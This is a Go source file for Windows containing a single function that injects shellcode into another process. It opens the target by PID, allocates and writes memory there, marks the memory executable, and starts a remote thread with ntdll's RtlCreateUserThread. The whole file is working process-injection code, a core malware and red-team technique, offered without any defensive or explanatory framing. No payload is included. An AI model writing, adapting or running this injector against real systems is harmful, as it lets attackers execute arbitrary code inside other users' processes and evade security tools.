package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ntCreateRemoteThread(pid int, shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	rtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	closeHandle := kernel32.NewProc("CloseHandle")

	pHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	oldProtect := windows.PAGE_READWRITE

	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling virtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pHandle), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pHandle), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	var tHandle uintptr
	_, _, errRtlCreateUserThread := rtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, lpBaseAddress, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
	}

	_, _, errCloseHandle := closeHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

	fmt.Printf("[%d] Injected...\n", pid)
}
